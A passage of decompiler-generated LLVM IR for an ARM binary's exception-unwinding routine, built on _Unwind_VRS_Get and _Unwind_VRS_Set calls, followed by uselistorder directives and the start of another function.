  store i32 ptrtoint (i32* @global_var_23010.748 to i32), i32* %r2.global-to-local, align 4
  %v4_18508 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 20) to i32*), align 4
  %v0_1850c = load i32, i32* %r5.global-to-local, align 4
  %v0_18510 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18510, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18508, i32* %stack_var_-48, align 4
  %v5_18524 = call i32 @_Unwind_VRS_Set(i32 %v0_18510, i32 %v0_1850c, i32 15, i32 %v0_1850c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1853c

dec_label_pc_18530:                               ; preds = %dec_label_pc_1847c
  %v7_18530 = icmp eq i32 %v4_18470, 2
  br i1 %v7_18530, label %dec_label_pc_18548, label %dec_label_pc_18538

dec_label_pc_18538:                               ; preds = %dec_label_pc_18530, %dec_label_pc_1861c, %dec_label_pc_184a8, %dec_label_pc_18810
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1853c

dec_label_pc_1853c:                               ; preds = %bb157, %dec_label_pc_18848, %dec_label_pc_187d8, %bb166, %dec_label_pc_184cc, %dec_label_pc_18538
  %v1_18544 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18848 ], [ %v1_18544.pre, %dec_label_pc_187d8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_184cc ], [ 9, %dec_label_pc_18538 ]
  store i32 %v3_18358, i32* %r4.global-to-local, align 4
  store i32 %v6_18358, i32* %r5.global-to-local, align 4
  ret i32 %v1_18544

dec_label_pc_18548:                               ; preds = %dec_label_pc_18530
  store i32 %v1_18388, i32* %r2.global-to-local, align 4
  %v0_1854c = load i32, i32* @r7, align 4
  %v1_1854c = inttoptr i32 %v0_1854c to i32*
  %v2_1854c = load i32, i32* %v1_1854c, align 4
  %tmp206 = bitcast i32 %v2_1854c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18554 = bitcast float %tmp207 to i32
  store i32 %v1_18554, i32* @sl, align 4
  br i1 %v2_18484, label %dec_label_pc_1855c, label %dec_label_pc_186c8

dec_label_pc_1855c:                               ; preds = %dec_label_pc_18548
  %v2_1855c = icmp eq i32 %v0_18614, 0
  br i1 %v2_1855c, label %dec_label_pc_186b0, label %dec_label_pc_18564

dec_label_pc_18564:                               ; preds = %dec_label_pc_1855c
  %v2_18568 = icmp eq i32 %v1_18554, 0
  br i1 %v2_18568, label %dec_label_pc_18574.thread, label %bb159

dec_label_pc_18574.thread:                        ; preds = %dec_label_pc_18564
  br label %dec_label_pc_187d8

bb159:                                            ; preds = %dec_label_pc_18564
  br i1 %v3_1856c, label %dec_label_pc_1857c, label %dec_label_pc_186b0

dec_label_pc_1857c:                               ; preds = %bb159
  %v1_1857c = add i32 %v0_1854c, 4
  store i32 %v1_1857c, i32* @r6, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1858c = load i32, i32* @r8, align 4
  %v1_1858c = add i32 %v0_1858c, 88
  store i32 %v1_1858c, i32* %sb.global-to-local, align 4
  store i32 %v1_1857c, i32* @r4, align 4
  br label %dec_label_pc_185b0

dec_label_pc_185a0:                               ; preds = %bb161
  %v1_185a0 = add i32 %v0_185a0, 1
  store i32 %v1_185a0, i32* @r5, align 4
  %v1_185a4 = load i32, i32* @sl, align 4
  %v9_185a4 = icmp eq i32 %v1_185a0, %v1_185a4
  %v0_185a8 = load i32, i32* @r4, align 4
  %v1_185a8 = add i32 %v0_185a8, 4
  store i32 %v1_185a8, i32* @r4, align 4
  br i1 %v9_185a4, label %dec_label_pc_187d8, label %dec_label_pc_185a0.dec_label_pc_185b0_crit_edge

dec_label_pc_185a0.dec_label_pc_185b0_crit_edge:  ; preds = %dec_label_pc_185a0
  %v0_185bc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_185b0

dec_label_pc_185b0:                               ; preds = %dec_label_pc_185a0.dec_label_pc_185b0_crit_edge, %dec_label_pc_1857c
  %v0_185bc = phi i32 [ %v0_185bc.pre, %dec_label_pc_185a0.dec_label_pc_185b0_crit_edge ], [ %v1_1858c, %dec_label_pc_1857c ]
  %v1_185c0 = phi i32 [ %v1_185a8, %dec_label_pc_185a0.dec_label_pc_185b0_crit_edge ], [ %v1_1857c, %dec_label_pc_1857c ]
  %v1_185b0 = inttoptr i32 %v1_185c0 to i32*
  %v2_185b0 = load i32, i32* %v1_185b0, align 4
  %v2_185b4 = icmp eq i32 %v2_185b0, 0
  store i32 %v0_185bc, i32* %forced_unwind_-44, align 4
  br i1 %v2_185b4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_185b0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_185b0, %bb160
  %v0_185c4 = load i32, i32* @r8, align 4
  store i32 %v0_185c4, i32* %r0.global-to-local, align 4
  store i32 %v2_18650, i32* %r2.global-to-local, align 4
  %v4_185d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 28) to i32*), align 4
  store i32 99808, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_185d4)
  %v0_185e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_185e0 = icmp eq i32 %v0_185e0, 0
  %v0_185a0 = load i32, i32* @r5, align 4
  br i1 %v2_185e0, label %dec_label_pc_185a0, label %dec_label_pc_185e8

dec_label_pc_185e8:                               ; preds = %bb161
  %v1_185e8 = load i32, i32* @sl, align 4
  %v9_185e8 = icmp eq i32 %v0_185a0, %v1_185e8
  br i1 %v9_185e8, label %dec_label_pc_187d8, label %dec_label_pc_185f0

dec_label_pc_185f0:                               ; preds = %dec_label_pc_185e8
  %v0_185f0 = load i32, i32* @r7, align 4
  %v1_185f0 = inttoptr i32 %v0_185f0 to i32*
  %v2_185f0 = load i32, i32* %v1_185f0, align 4
  %v1_185f4 = icmp slt i32 %v2_185f0, 0
  %v0_185fc.pre = load i32, i32* @r6, align 4
  br i1 %v1_185f4, label %dec_label_pc_185fc, label %dec_label_pc_186bc

dec_label_pc_185fc:                               ; preds = %dec_label_pc_185f0, %dec_label_pc_186b4
  %v0_185fc = phi i32 [ %storemerge, %dec_label_pc_186b4 ], [ %v0_185fc.pre, %dec_label_pc_185f0 ]
  store i32 %v0_185fc, i32* %r0.global-to-local, align 4
  %v1_18600 = add i32 %v0_185fc, 4
  store i32 %v1_18600, i32* @r6, align 4
  br label %dec_label_pc_186bc

dec_label_pc_18608:                               ; preds = %bb154
  store i32 %v1_18388, i32* %r2.global-to-local, align 4
  br i1 %v2_18484, label %dec_label_pc_18614, label %dec_label_pc_18700

dec_label_pc_18614:                               ; preds = %dec_label_pc_18608
  %v2_18614 = icmp eq i32 %v0_18614, 0
  br i1 %v2_18614, label %dec_label_pc_18680, label %dec_label_pc_1861c

dec_label_pc_1861c:                               ; preds = %dec_label_pc_18614
  %v0_1861c = load i32, i32* @r7, align 4
  %v1_1861c = add i32 %v0_1861c, 4
  %v2_1861c = inttoptr i32 %v1_1861c to i32*
  %v3_1861c = load i32, i32* %v2_1861c, align 4
  %v7_18620 = icmp eq i32 %v3_1861c, -2
  store i32 %v1_1861c, i32* %r2.global-to-local, align 4
  br i1 %v7_18620, label %dec_label_pc_18538, label %dec_label_pc_1862c

dec_label_pc_1862c:                               ; preds = %dec_label_pc_1861c
  %v0_1862c = load i32, i32* @r8, align 4
  %v1_1862c = add i32 %v0_1862c, 88
  %v7_18630 = icmp eq i32 %v3_1861c, -1
  store i32 %v1_1862c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18630, label %dec_label_pc_18674, label %dec_label_pc_1863c

dec_label_pc_1863c:                               ; preds = %dec_label_pc_1862c
  %v2_18640 = icmp eq i32 %v3_1861c, 0
  br i1 %v2_18640, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1863c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_1863c, %bb162
  store i32 %v0_1862c, i32* %r0.global-to-local, align 4
  store i32 %v2_18650, i32* %r2.global-to-local, align 4
  %v4_1865c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 28) to i32*), align 4
  store i32 99944, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1865c)
  %v0_18668 = load i32, i32* %r0.global-to-local, align 4
  %v2_18668 = icmp eq i32 %v0_18668, 0
  br i1 %v2_18668, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18674.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18674

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18680

dec_label_pc_18674:                               ; preds = %.thread25, %dec_label_pc_1862c
  %v3_18674 = phi i32 [ %v3_18674.pr, %.thread25 ], [ %v1_1862c, %dec_label_pc_1862c ]
  %v2_18678 = icmp eq i32 %v3_18674, 0
  br i1 %v2_18678, label %dec_label_pc_18680, label %dec_label_pc_187d8

dec_label_pc_18680:                               ; preds = %bb164, %dec_label_pc_1872c, %dec_label_pc_18700, %dec_label_pc_18674, %dec_label_pc_18614
  %v0_18680 = load i32, i32* @r7, align 4
  %v1_18680 = add i32 %v0_18680, 8
  %v1_183e8 = inttoptr i32 %v1_18680 to i32*
  %v2_183e8 = load i32, i32* %v1_183e8, align 4
  %v2_183ec = icmp eq i32 %v2_183e8, 0
  br i1 %v2_183ec, label %dec_label_pc_184a8, label %dec_label_pc_183f4.preheader

dec_label_pc_18688:                               ; preds = %entry
  %v3_18688 = udiv i32 %v2_1837c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18698 = mul nuw nsw i32 %v3_18688, 4
  %v3_1869c = mul i32 %v2_1837c, 65536
  %v2_186a0 = add i32 %v6_18698, %v4_1837c
  store i32 %v3_1869c, i32* %v4_1839c, align 8
  br label %dec_label_pc_183c4

dec_label_pc_186b0:                               ; preds = %bb159, %dec_label_pc_1855c
  %v1_186b0 = add i32 %v0_1854c, 4
  br label %dec_label_pc_186b4

dec_label_pc_186b4:                               ; preds = %dec_label_pc_186f4, %dec_label_pc_186b0
  %v0_186b4 = phi i32 [ %v2_186f4, %dec_label_pc_186f4 ], [ %v2_1854c, %dec_label_pc_186b0 ]
  %storemerge = phi i32 [ %v4_186f4, %dec_label_pc_186f4 ], [ %v1_186b0, %dec_label_pc_186b0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_186b4 = icmp slt i32 %v0_186b4, 0
  br i1 %v1_186b4, label %dec_label_pc_185fc, label %dec_label_pc_186bc

dec_label_pc_186bc:                               ; preds = %dec_label_pc_185f0, %dec_label_pc_186b4, %dec_label_pc_187c8, %dec_label_pc_185fc
  %v0_186c0 = phi i32 [ %v1_18600, %dec_label_pc_185fc ], [ %storemerge, %dec_label_pc_186b4 ], [ %v1_187cc, %dec_label_pc_187c8 ], [ %v0_185fc.pre, %dec_label_pc_185f0 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_185fc ], [ %stack_var_-76.2.ph3175, %dec_label_pc_186b4 ], [ %v1_187c8, %dec_label_pc_187c8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_185f0 ]
  %v0_186bc = load i32, i32* @sl, align 4
  %v3_186bc = mul i32 %v0_186bc, 4
  %v2_186c0 = add i32 %v3_186bc, %v0_186c0
  %v1_183e865 = inttoptr i32 %v2_186c0 to i32*
  %v2_183e866 = load i32, i32* %v1_183e865, align 4
  %v2_183ec68 = icmp eq i32 %v2_183e866, 0
  br i1 %v2_183ec68, label %dec_label_pc_184a8, label %dec_label_pc_183f4.preheader.lr.ph

dec_label_pc_186c8:                               ; preds = %dec_label_pc_18548
  %v0_186d8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_186d8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_186e0 = load i32, i32* @r8, align 4
  %v1_186e0 = add i32 %v0_186e0, 32
  %v2_186e0 = inttoptr i32 %v1_186e0 to i32*
  %v3_186e0 = load i32, i32* %v2_186e0, align 4
  store i32 %v3_186e0, i32* @r4, align 4
  %v5_186e4 = call i32 @_Unwind_VRS_Get(i32 %v0_186d8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_186e4, i32* %r0.global-to-local, align 4
  %v3_186e8 = load i32, i32* %stack_var_-48, align 4
  %v0_186ec = load i32, i32* @r4, align 4
  %v9_186ec = icmp eq i32 %v0_186ec, %v3_186e8
  br i1 %v9_186ec, label %dec_label_pc_18794, label %dec_label_pc_186c8.dec_label_pc_186f4_crit_edge

dec_label_pc_186c8.dec_label_pc_186f4_crit_edge:  ; preds = %dec_label_pc_186c8
  %v0_186f4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_186f4

dec_label_pc_186f4:                               ; preds = %dec_label_pc_186c8.dec_label_pc_186f4_crit_edge, %dec_label_pc_18794
  %v0_186f4 = phi i32 [ %v0_186f4.pre, %dec_label_pc_186c8.dec_label_pc_186f4_crit_edge ], [ %v1_18798, %dec_label_pc_18794 ]
  %v1_186f4 = inttoptr i32 %v0_186f4 to i32*
  %v2_186f4 = load i32, i32* %v1_186f4, align 4
  %v4_186f4 = add i32 %v0_186f4, 4
  store i32 %v4_186f4, i32* @r7, align 4
  br label %dec_label_pc_186b4

dec_label_pc_18700:                               ; preds = %dec_label_pc_18608
  %v0_18710 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18710, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18718 = load i32, i32* @r8, align 4
  %v1_18718 = add i32 %v0_18718, 32
  %v2_18718 = inttoptr i32 %v1_18718 to i32*
  %v3_18718 = load i32, i32* %v2_18718, align 4
  store i32 %v3_18718, i32* @r4, align 4
  %v5_1871c = call i32 @_Unwind_VRS_Get(i32 %v0_18710, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1871c, i32* %r0.global-to-local, align 4
  %v3_18720 = load i32, i32* %stack_var_-48, align 4
  %v0_18724 = load i32, i32* @r4, align 4
  %v9_18724 = icmp eq i32 %v0_18724, %v3_18720
  br i1 %v9_18724, label %dec_label_pc_1872c, label %dec_label_pc_18680

dec_label_pc_1872c:                               ; preds = %dec_label_pc_18700
  %v0_1872c = load i32, i32* @r8, align 4
  %v1_1872c = add i32 %v0_1872c, 40
  %v2_1872c = inttoptr i32 %v1_1872c to i32*
  %v3_1872c = load i32, i32* %v2_1872c, align 4
  %v1_18730 = load i32, i32* @r7, align 4
  %v9_18730 = icmp eq i32 %v3_1872c, %v1_18730
  br i1 %v9_18730, label %dec_label_pc_18738, label %dec_label_pc_18680

dec_label_pc_18738:                               ; preds = %dec_label_pc_1872c
  %v1_18738 = inttoptr i32 %v3_1872c to i32*
  %v2_18738 = load i32, i32* %v1_18738, align 4
  %v1_1873c = and i32 %v2_18738, 1073741824
  %v2_1873c = icmp eq i32 %v1_1873c, 0
  br i1 %v2_1873c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18738
  %v2_18740 = or i32 %v2_18738, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18738
  %tmp208 = bitcast i32 %v2_18738 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18744 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18748 = phi i32 [ %v2_18878, %.thread28 ], [ %v2_18878, %bb169 ], [ %v3_1872c, %bb165 ], [ %v3_1872c, %.thread26 ]
  %v0_18748 = phi i32 [ %v2_18888, %.thread28 ], [ %v2_18884, %bb169 ], [ %v2_18740, %bb165 ], [ %v2_18744, %.thread26 ]
  %v2_18748 = add i32 %v0_18748, %v1_18748
  store i32 %v2_18748, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18760 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18760, i32* %r0.global-to-local, align 4
  %v5_18768 = call i32 @_Unwind_VRS_Set(i32 %v0_18760, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18760, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18780 = load i32, i32* @r8, align 4
  store i32 %v0_18780, i32* %stack_var_-48, align 4
  %v5_18788 = call i32 @_Unwind_VRS_Set(i32 %v0_18760, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1853c

dec_label_pc_18794:                               ; preds = %dec_label_pc_186c8
  %v0_18794 = load i32, i32* @r8, align 4
  %v1_18794 = add i32 %v0_18794, 40
  %v2_18794 = inttoptr i32 %v1_18794 to i32*
  %v3_18794 = load i32, i32* %v2_18794, align 4
  %v1_18798 = load i32, i32* @r7, align 4
  %v9_18798 = icmp eq i32 %v3_18794, %v1_18798
  br i1 %v9_18798, label %dec_label_pc_187a0, label %dec_label_pc_186f4

dec_label_pc_187a0:                               ; preds = %dec_label_pc_18794
  %v1_187a4 = add i32 %v3_18794, 4
  store i32 %v1_187a4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_187ac = add i32 %v0_18794, 44
  %v3_187ac = inttoptr i32 %v2_187ac to i32*
  store i32 0, i32* %v3_187ac, align 4
  %v0_187b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_187b0 = load i32, i32* @r8, align 4
  %v2_187b0 = add i32 %v1_187b0, 48
  %v3_187b0 = inttoptr i32 %v2_187b0 to i32*
  store i32 %v0_187b0, i32* %v3_187b0, align 4
  %v0_187b4 = load i32, i32* @sl, align 4
  %v1_187b4 = load i32, i32* @r8, align 4
  %v2_187b4 = add i32 %v1_187b4, 40
  %v3_187b4 = inttoptr i32 %v2_187b4 to i32*
  store i32 %v0_187b4, i32* %v3_187b4, align 4
  %v0_187b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_187b8 = load i32, i32* @r8, align 4
  %v2_187b8 = add i32 %v1_187b8, 52
  %v3_187b8 = inttoptr i32 %v2_187b8 to i32*
  store i32 %v0_187b8, i32* %v3_187b8, align 4
  %v0_187bc = load i32, i32* @r7, align 4
  %v1_187bc = inttoptr i32 %v0_187bc to i32*
  %v2_187bc = load i32, i32* %v1_187bc, align 4
  %v1_187c0 = icmp slt i32 %v2_187bc, 0
  br i1 %v1_187c0, label %dec_label_pc_187c8, label %dec_label_pc_18874

dec_label_pc_187c8:                               ; preds = %dec_label_pc_187a0
  %v0_187c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_187c8 = add i32 %v0_187c8, -3
  store i32 %v1_187c8, i32* %r2.global-to-local, align 4
  %v0_187cc = load i32, i32* %r0.global-to-local, align 4
  %v1_187cc = add i32 %v0_187cc, 4
  store i32 %v1_187cc, i32* @r6, align 4
  br label %dec_label_pc_186bc

dec_label_pc_187d8:                               ; preds = %dec_label_pc_185e8, %dec_label_pc_18674, %dec_label_pc_185a0, %dec_label_pc_18574.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_187e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_187e8, i32* %r0.global-to-local, align 4
  %v5_187f0 = call i32 @_Unwind_VRS_Get(i32 %v0_187e8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_187f4 = load i32, i32* @r7, align 4
  %v1_187f4 = load i32, i32* @r8, align 4
  %v2_187f4 = add i32 %v1_187f4, 40
  %v3_187f4 = inttoptr i32 %v2_187f4 to i32*
  store i32 %v0_187f4, i32* %v3_187f4, align 4
  %v3_187f8 = load i32, i32* %stack_var_-48, align 4
  %v3_187fc = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_187fc, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18804 = load i32, i32* @r8, align 4
  %v2_18804 = add i32 %v1_18804, 32
  %v3_18804 = inttoptr i32 %v2_18804 to i32*
  store i32 %v3_187f8, i32* %v3_18804, align 4
  %v0_18808 = load i32, i32* %r2.global-to-local, align 4
  %v1_18808 = load i32, i32* @r8, align 4
  %v2_18808 = add i32 %v1_18808, 36
  %v3_18808 = inttoptr i32 %v2_18808 to i32*
  store i32 %v0_18808, i32* %v3_18808, align 4
  %v1_18544.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1853c

dec_label_pc_18810:                               ; preds = %bb155
  %v1_18810 = inttoptr i32 %v0_18498 to i32*
  %v2_18810 = load i32, i32* %v1_18810, align 4
  %v1_18814 = add i32 %v0_18498, 4
  %v1_18818 = and i32 %v2_18810, 1073741824
  %v2_18818 = icmp eq i32 %v1_18818, 0
  %v2_1881c = or i32 %v2_18810, -2147483648
  %tmp210 = bitcast i32 %v2_18810 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18820 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18818, i32 %v2_18820, i32 %v2_1881c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18824 = load i32, i32* @r8, align 4
  %v2_18824 = add i32 %v1_18824, 56
  %v3_18824 = inttoptr i32 %v2_18824 to i32*
  store i32 %v1_18814, i32* %v3_18824, align 4
  %v0_18828 = load i32, i32* @r8, align 4
  store i32 %v0_18828, i32* %r0.global-to-local, align 4
  %v4_18834 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 16) to i32*), align 4
  store i32 100416, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18834)
  %v0_18840 = load i32, i32* %r0.global-to-local, align 4
  %v2_18840 = icmp eq i32 %v0_18840, 0
  br i1 %v2_18840, label %dec_label_pc_18538, label %dec_label_pc_18848

dec_label_pc_18848:                               ; preds = %dec_label_pc_18810
  %v0_18848 = load i32, i32* %r4.global-to-local, align 4
  %v1_18848 = load i32, i32* @r7, align 4
  %v2_18848 = add i32 %v1_18848, %v0_18848
  store i32 %v2_18848, i32* %stack_var_-48, align 4
  %v0_18858 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18858, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18868 = call i32 @_Unwind_VRS_Set(i32 %v0_18858, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1853c

dec_label_pc_18874:                               ; preds = %dec_label_pc_187a0
  %v0_18874 = load i32, i32* @sl, align 4
  %v3_18874 = mul i32 %v0_18874, 4
  %v0_18878 = load i32, i32* %r0.global-to-local, align 4
  %v2_18878 = add i32 %v0_18878, %v3_18874
  %v3_18878 = inttoptr i32 %v2_18878 to i32*
  %v4_18878 = load i32, i32* %v3_18878, align 4
  %v1_1887c = and i32 %v4_18878, 1073741824
  %v2_1887c = icmp eq i32 %v1_1887c, 0
  br i1 %v2_1887c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18874
  %v2_18884 = or i32 %v4_18878, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18874
  %tmp212 = bitcast i32 %v4_18878 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18888 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18878, { 2, 1, 0 }
  uselistorder i32 %v1_187cc, { 1, 0 }
  uselistorder i32 %v1_187c8, { 1, 0 }
  uselistorder i32 %v1_18798, { 1, 0 }
  uselistorder i32 %v0_18760, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1872c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_186f4, { 1, 0 }
  uselistorder i32 %v0_186f4, { 1, 0 }
  uselistorder i32 %v2_183e866, { 1, 0 }
  uselistorder i32 %v2_186c0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_183e8, { 1, 0 }
  uselistorder i32 %v1_18680, { 1, 0 }
  uselistorder i32 %v3_1861c, { 2, 0, 1 }
  uselistorder i32 %v0_185fc, { 1, 0 }
  uselistorder i32 %v0_185fc.pre, { 1, 0 }
  uselistorder i32 %v1_18554, { 1, 0 }
  uselistorder i32 %v2_1854c, { 1, 0 }
  uselistorder i32 %v0_184dc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_1849c, { 1, 0 }
  uselistorder i32 %v1_18498, { 1, 0 }
  uselistorder i32 %v0_18498, { 1, 0, 2 }
  uselistorder i32 %v4_18470, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18614, { 1, 2, 0 }
  uselistorder i32 %v0_18448, { 1, 0 }
  uselistorder i32 %v3_18444, { 1, 0, 2 }
  uselistorder i32 %v1_18418, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18650, { 1, 0 }
  uselistorder i1 %v2_18484, { 1, 0, 2 }
  uselistorder i32 %v1_18388, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_6* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 -3, { 2, 3, 5, 4, 6, 0, 1 }
  uselistorder i32 52, { 7, 1, 0, 3, 4, 5, 6, 2 }
  uselistorder i32 48, { 33, 29, 30, 7, 31, 8, 32, 5, 13, 14, 4, 15, 16, 17, 1, 18, 19, 2, 20, 3, 21, 6, 0, 9, 10, 11, 25, 26, 22, 23, 24, 27, 28, 12 }
  uselistorder i32 -2147483648, { 25, 26, 27, 28, 29, 30, 31, 32, 3, 4, 6, 7, 8, 0, 9, 1, 10, 2, 11, 16, 17, 18, 19, 20, 21, 22, 23, 12, 13, 14, 15, 5, 24 }
  uselistorder i32 1073741824, { 9, 10, 11, 12, 13, 14, 15, 16, 2, 3, 4, 5, 0, 6, 1, 8, 7 }
  uselistorder i32 65536, { 1, 2, 4, 3, 100, 6, 7, 5, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 99, 37, 38, 36, 39, 40, 41, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 0, 65, 66, 67, 98, 96, 97, 68, 69, 70, 71, 80, 72, 81, 73, 82, 74, 83, 75, 84, 76, 85, 77, 86, 78, 87, 79, 88, 89, 91, 90, 92, 93, 94, 95 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.748 to i32), i32 28) to i32*), { 1, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23010.748 to i32), { 4, 0, 5, 6, 1, 2, 7, 8, 3 }
  uselistorder i32 -2, { 0, 56, 57, 21, 7, 8, 4, 3, 6, 5, 9, 10, 15, 16, 12, 11, 14, 13, 22, 23, 17, 24, 25, 26, 1, 27, 37, 20, 38, 39, 40, 28, 58, 30, 29, 31, 32, 2, 18, 19, 34, 35, 36, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 52, 55, 50, 53, 54, 33 }
  uselistorder i32 80, { 4, 5, 6, 0, 2, 3, 1 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_187d8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_186f4, { 1, 0 }
  uselistorder label %dec_label_pc_186bc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18680, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_185fc, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1853c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18538, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18498, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_183f4, { 1, 0 }
  uselistorder label %dec_label_pc_183f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_183f4.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_18894(i32 %arg1) local_unnamed_addr {
dec_label_pc_18894:
  %v0_18894 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18894, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18894
